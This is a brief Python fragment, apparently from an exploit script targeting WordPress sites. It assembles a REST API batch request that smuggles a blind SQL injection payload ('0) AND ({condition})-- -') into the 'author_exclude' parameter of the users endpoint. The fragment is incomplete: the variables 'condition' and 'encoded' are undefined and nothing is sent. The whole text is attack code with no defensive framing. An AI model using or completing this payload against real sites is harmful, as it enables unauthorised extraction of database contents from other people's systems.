import urllib.request
primer = {"method": "POST", "path": "///"}
query = f"0) AND ({condition})-- -"
inner = {"requests": [primer, {"method": "GET", "path": f"/wp/v2/users?author_exclude={encoded}"}, {"method": "GET", "path": "/wp/v2/posts"}]}
batch_path = "/batch/v1"
